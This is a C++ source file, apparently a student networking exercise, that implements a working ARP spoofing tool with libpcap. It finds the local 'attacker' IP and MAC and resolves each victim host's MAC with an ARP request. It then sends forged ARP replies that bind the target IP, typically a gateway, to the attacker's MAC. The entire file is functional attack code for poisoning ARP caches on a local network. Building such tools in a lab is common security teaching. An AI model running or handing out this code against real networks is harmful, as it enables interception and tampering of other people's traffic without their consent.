#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <cstring>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#pragma pack(push, 1)
#define SUCCESS 0
#define FAIL -1
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}
int get_attacker_ip(char* dev, uint32_t* ip)
{
    struct ifreq ifr;
    uint8_t ip_arr[Ip::SIZE];
    int sockfd=socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd<0) {
        printf("Failed to get attacker's IP! (reason : socket() failed)\n");
        return FAIL;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    int ret=ioctl(sockfd,SIOCGIFADDR, &ifr);
    if(ret<0) {
        printf("Failed to get attacker's IP! (reason : ioctl() failed\n)");
        close(sockfd);
        return FAIL;
    }
    memcpy(ip_arr, ifr.ifr_addr.sa_data+2, Ip::SIZE);
    *ip=(ip_arr[0]<<24)|(ip_arr[1]<<16)|(ip_arr[2]<<8)|(ip_arr[3]);
    close(sockfd);
    return SUCCESS;
}

int get_attacker_mac(char* dev, uint8_t* mac)
{
    struct ifreq ifr;
    int sockfd=socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd<0) {
        printf("Failed to get attacker's MAC! (reason : socket() failed)\n");
        return FAIL;
    }
    ifr.ifr_addr.sa_family=AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    int ret=ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if(ret<0) {
        printf("Failed to get attacker's MAC! (reason : ioctl() failed)\n");
        close(sockfd);
        return FAIL;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
    close(sockfd);
    return SUCCESS;
}
EthArpPacket get_packet(Ip attacker_ip, Ip sender_ip, Mac attacker_mac)
{
    EthArpPacket packet;
    packet.eth_.smac_ = Mac(attacker_mac);
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(attacker_mac);
    packet.arp_.sip_ = htonl(Ip(attacker_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);
    return packet;
}
int get_sender_mac(char* dev, Ip sender_ip, Mac attacker_mac, Ip attacker_ip, uint8_t* mac)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        printf("Failed to get sender's MAC! (reason : couldn't open device %s - %s)\n",dev,errbuf);
        return FAIL;
    }
    EthArpPacket packet=get_packet(attacker_ip, sender_ip, attacker_mac);
    struct pcap_pkthdr* packet_hdr;
    const u_char* temp_packet;
    EthArpPacket* recv_packet;
    while(1) {
        int ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet), sizeof(EthArpPacket));
        if(ret!=0) {
            printf("Failed to get sender's MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
            return FAIL;
        }
        ret=pcap_next_ex(handle, &packet_hdr, &temp_packet);
        if(ret==0) continue;
        if(ret<0) {
            printf("Failed to get sender's MAC! (reason : pcap_next_ex return %d error=%s)\n",ret,pcap_geterr(handle));
            return FAIL;
        }
        recv_packet=(EthArpPacket*)temp_packet;
        if(recv_packet->eth_.type_!=htons(EthHdr::Arp)) continue;
        if(recv_packet->arp_.op_!=htons(ArpHdr::Reply)) continue;
        if(recv_packet->arp_.sip_!=packet.arp_.tip_) continue;
        if(recv_packet->arp_.tip_!=packet.arp_.sip_) continue;
        memcpy(mac, &recv_packet->arp_.smac_, Mac::SIZE);
        break;
    }
    return SUCCESS;
}
EthArpPacket get_spoofing_packet(Ip target_ip, Ip sender_ip, Mac sender_mac, Mac attacker_mac)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);
    return packet;
}
int arp_spoof(char* dev, pcap_t* handle, Ip sender_ip, Ip target_ip)
{
    uint32_t ip;
    int ret=get_attacker_ip(dev, &ip);
    if(ret<0) return FAIL;
    Ip attacker_ip=Ip(ip);
    uint8_t attacker_mac_arr[Mac::SIZE];
    ret=get_attacker_mac(dev, attacker_mac_arr);
    if(ret<0) return FAIL;
    Mac attacker_mac=Mac(attacker_mac_arr);
    uint8_t sender_mac_arr[Mac::SIZE];
    ret=get_sender_mac(dev, sender_ip, attacker_mac, attacker_ip, sender_mac_arr);
    if(ret<0) return FAIL;
    Mac sender_mac=Mac(sender_mac_arr);
    EthArpPacket packet=get_spoofing_packet(target_ip, sender_ip, sender_mac, attacker_mac);
    ret=pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if(ret!=0) {
        printf("Failed at spoofing! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
        return FAIL;
    }
    return SUCCESS;
}
int main(int argc, char* argv[]) {
    if (argc<4||argc&1) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    int cnt=(argc-2)/2;
    for(int i = 1; i <= cnt; i++) {
        printf("Case num : %d\n",i);
        Ip sender_ip=Ip(argv[2*i]);
        Ip target_ip=Ip(argv[2*i+1]);
        int ret=arp_spoof(dev, handle, sender_ip, target_ip);
        if(ret==FAIL) break;
    }
	pcap_close(handle);
    return 0;
}
